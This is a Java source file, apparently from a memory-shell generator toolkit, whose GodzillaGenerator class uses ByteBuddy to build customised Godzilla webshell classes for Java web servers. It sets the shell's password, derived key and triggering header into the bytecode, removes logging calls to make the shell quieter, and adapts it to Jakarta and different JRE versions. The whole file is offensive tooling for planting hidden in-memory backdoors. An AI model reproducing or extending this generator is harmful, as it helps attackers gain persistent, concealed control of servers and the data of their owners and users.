package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.GodzillaConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.utils.DigestUtils;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import org.apache.commons.lang3.StringUtils;

import java.util.HashMap;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/23
 */
public class GodzillaGenerator {
    private final ShellConfig shellConfig;
    private final GodzillaConfig godzillaConfig;

    public GodzillaGenerator(ShellConfig shellConfig, GodzillaConfig godzillaConfig) {
        this.shellConfig = shellConfig;
        this.godzillaConfig = godzillaConfig;
    }

    public DynamicType.Builder<?> getBuilder() {
        if (godzillaConfig.getShellClass() == null) {
            throw new IllegalArgumentException("godzillaConfig.getClazz() == null");
        }
        if (StringUtils.isBlank(godzillaConfig.getKey()) || StringUtils.isBlank(godzillaConfig.getPass())) {
            throw new IllegalArgumentException("godzillaConfig.getKey().isBlank() || godzillaConfig.getPass().isBlank()");
        }
        String md5Key = DigestUtils.md5Hex(godzillaConfig.getKey()).substring(0, 16);
        String md5 = DigestUtils.md5Hex(godzillaConfig.getPass() + md5Key).toUpperCase();

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(godzillaConfig.getShellClass())
                .name(godzillaConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }

        if (shellConfig.getShellType().startsWith(ShellType.AGENT)) {
            builder = builder.visit(
                    new LdcReAssignVisitorWrapper(new HashMap<Object, Object>(3) {{
                        put("pass", godzillaConfig.getPass());
                        put("key", md5Key);
                        put("md5", md5);
                        put("headerName", godzillaConfig.getHeaderName());
                        put("headerValue", godzillaConfig.getHeaderValue());
                    }})
            );
        } else {
            builder = builder.field(named("pass")).value(godzillaConfig.getPass())
                    .field(named("key")).value(md5Key)
                    .field(named("md5")).value(md5)
                    .field(named("headerName")).value(godzillaConfig.getHeaderName())
                    .field(named("headerValue")).value(godzillaConfig.getHeaderValue());
        }
        return builder;
    }

    public byte[] getBytes() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
        }
    }
}